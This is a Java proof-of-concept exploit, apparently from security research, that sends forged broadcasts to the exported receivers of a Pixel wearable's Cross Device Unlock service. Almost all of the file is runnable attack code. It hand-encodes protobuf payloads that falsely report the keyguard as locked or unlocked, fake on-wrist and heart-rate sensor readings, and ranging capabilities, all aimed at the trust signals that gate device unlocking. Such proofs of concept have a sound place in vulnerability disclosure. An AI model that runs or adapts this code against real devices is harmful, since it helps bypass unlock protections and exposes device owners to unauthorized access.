import android.content.Intent;
import android.content.Context;
import android.os.Looper;
import java.io.ByteArrayOutputStream;

/**
 * PoC: Inject fake keyguard state and sensor data into CrossDeviceAccessService
 * via its exported broadcast receivers (NO permission required).
 *
 * This demonstrates that a zero-permission app can feed false data into the
 * Cross Device Unlock (CDU) system by sending crafted protobuf payloads.
 */
public class CDUInject {

    // Protobuf wire types
    static final int WIRETYPE_VARINT = 0;
    static final int WIRETYPE_FIXED32 = 5;
    static final int WIRETYPE_LENGTH_DELIMITED = 2;

    public static void main(String[] args) throws Exception {
        System.out.println("=== CDU Broadcast Injection PoC ===");
        System.out.println("UID: " + android.os.Process.myUid());
        System.out.println("PID: " + android.os.Process.myPid());

        Looper.prepareMainLooper();

        // Get ActivityThread for context
        Class<?> atClass = Class.forName("android.app.ActivityThread");
        Object at = atClass.getMethod("systemMain").invoke(null);
        Context ctx = (Context) atClass.getMethod("getSystemContext").invoke(at);

        System.out.println("\n--- Test 1: Inject fake keyguard state (unlocked) ---");
        testKeyguardInjection(ctx, false); // false = keyguard NOT locked (phone unlocked)

        System.out.println("\n--- Test 2: Inject fake keyguard state (locked) ---");
        testKeyguardInjection(ctx, true); // true = keyguard locked

        System.out.println("\n--- Test 3: Inject fake on-body sensor (on wrist) ---");
        testSensorInjection(ctx, 34, 3, 1.0f); // TYPE_LOW_LATENCY_OFFBODY_DETECT, HIGH accuracy, 1.0 = on body

        System.out.println("\n--- Test 4: Inject fake off-body sensor (off wrist) ---");
        testSensorInjection(ctx, 34, 3, 0.0f); // TYPE_LOW_LATENCY_OFFBODY_DETECT, HIGH accuracy, 0.0 = off body

        System.out.println("\n--- Test 5: Inject fake heart rate sensor ---");
        testSensorInjection(ctx, 21, 3, 72.0f); // TYPE_HEART_RATE, HIGH accuracy, 72 bpm

        System.out.println("\n--- Test 6: Inject fake ranging capabilities ---");
        testRangingInjection(ctx);

        System.out.println("\n=== All injection tests completed ===");
    }

    static void testKeyguardInjection(Context ctx, boolean locked) {
        try {
            // Build CrossDeviceAccessServiceKeyguardEvent protobuf manually
            // Field 1: isKeyguardLocked (bool, wire type 0 = varint)
            // Field 2: updateTimestamp (Timestamp message, wire type 2 = length-delimited)
            ByteArrayOutputStream proto = new ByteArrayOutputStream();

            // Field 1: tag = (1 << 3) | 0 = 0x08
            proto.write(0x08);
            proto.write(locked ? 0x01 : 0x00);

            // Field 2: Timestamp - seconds since epoch
            // tag = (2 << 3) | 2 = 0x12
            long nowSeconds = System.currentTimeMillis() / 1000;
            byte[] timestampProto = buildTimestamp(nowSeconds);
            proto.write(0x12);
            writeVarint(proto, timestampProto.length);
            proto.write(timestampProto);

            byte[] payload = proto.toByteArray();
            System.out.println("  Payload size: " + payload.length + " bytes");
            System.out.println("  Payload hex: " + bytesToHex(payload));
            System.out.println("  isKeyguardLocked: " + locked);

            Intent intent = new Intent("com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_KEYGUARD_STATE_CHANGED_EVENT");
            intent.putExtra("crossdeviceaccessservice.keyguard_event_data", payload);
            ctx.sendBroadcast(intent);

            System.out.println("  BROADCAST SENT SUCCESSFULLY");
        } catch (Exception e) {
            System.out.println("  ERROR: " + e.getMessage());
            e.printStackTrace();
        }
    }

    static void testSensorInjection(Context ctx, int sensorType, int accuracy, float value) {
        try {
            // Build CrossDeviceAccessServiceSensorEvent protobuf manually
            // Field 1: sensorType (enum/int, wire type 0)
            // Field 2: sensorTimestamp (Timestamp, wire type 2)
            // Field 3: sensorAccuracy (enum/int, wire type 0)
            // Field 4: sensorValues (packed repeated float, wire type 2)
            ByteArrayOutputStream proto = new ByteArrayOutputStream();

            // Field 1: sensorType, tag = 0x08
            proto.write(0x08);
            writeVarint(proto, sensorType);

            // Field 2: sensorTimestamp
            long nowSeconds = System.currentTimeMillis() / 1000;
            byte[] timestampProto = buildTimestamp(nowSeconds);
            proto.write(0x12);
            writeVarint(proto, timestampProto.length);
            proto.write(timestampProto);

            // Field 3: sensorAccuracy, tag = 0x18
            proto.write(0x18);
            writeVarint(proto, accuracy);

            // Field 4: sensorValues (packed), tag = 0x22
            proto.write(0x22);
            int floatBits = Float.floatToIntBits(value);
            proto.write(0x04); // 4 bytes for one float
            proto.write(floatBits & 0xFF);
            proto.write((floatBits >> 8) & 0xFF);
            proto.write((floatBits >> 16) & 0xFF);
            proto.write((floatBits >> 24) & 0xFF);

            byte[] payload = proto.toByteArray();
            String sensorName = getSensorName(sensorType);
            System.out.println("  Sensor: " + sensorName + " (type=" + sensorType + ")");
            System.out.println("  Value: " + value + ", Accuracy: " + accuracy);
            System.out.println("  Payload size: " + payload.length + " bytes");
            System.out.println("  Payload hex: " + bytesToHex(payload));

            Intent intent = new Intent("com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_SENSOR_EVENT");
            intent.putExtra("crossdeviceaccessservice.sensor_event_data", payload);
            ctx.sendBroadcast(intent);

            System.out.println("  BROADCAST SENT SUCCESSFULLY");
        } catch (Exception e) {
            System.out.println("  ERROR: " + e.getMessage());
            e.printStackTrace();
        }
    }

    static void testRangingInjection(Context ctx) {
        try {
            // Empty payload to test if receiver accepts it
            byte[] payload = new byte[]{};

            Intent intent = new Intent("com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_RANGING_CAPABILITIES_EVENT");
            intent.putExtra("crossdeviceaccessservice.ranging_capabilities_data", payload);
            ctx.sendBroadcast(intent);

            System.out.println("  BROADCAST SENT SUCCESSFULLY (empty payload)");
        } catch (Exception e) {
            System.out.println("  ERROR: " + e.getMessage());
            e.printStackTrace();
        }
    }

    static byte[] buildTimestamp(long seconds) throws Exception {
        ByteArrayOutputStream ts = new ByteArrayOutputStream();
        // Field 1: seconds (int64, wire type 0)
        ts.write(0x08);
        writeVarint(ts, seconds);
        return ts.toByteArray();
    }

    static void writeVarint(ByteArrayOutputStream out, long value) {
        while ((value & ~0x7FL) != 0) {
            out.write((int) ((value & 0x7F) | 0x80));
            value >>>= 7;
        }
        out.write((int) (value & 0x7F));
    }

    static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b & 0xff));
        }
        return sb.toString();
    }

    static String getSensorName(int type) {
        switch (type) {
            case 1: return "ACCELEROMETER";
            case 8: return "PROXIMITY";
            case 21: return "HEART_RATE";
            case 34: return "LOW_LATENCY_OFFBODY_DETECT";
            default: return "UNKNOWN(" + type + ")";
        }
    }
}
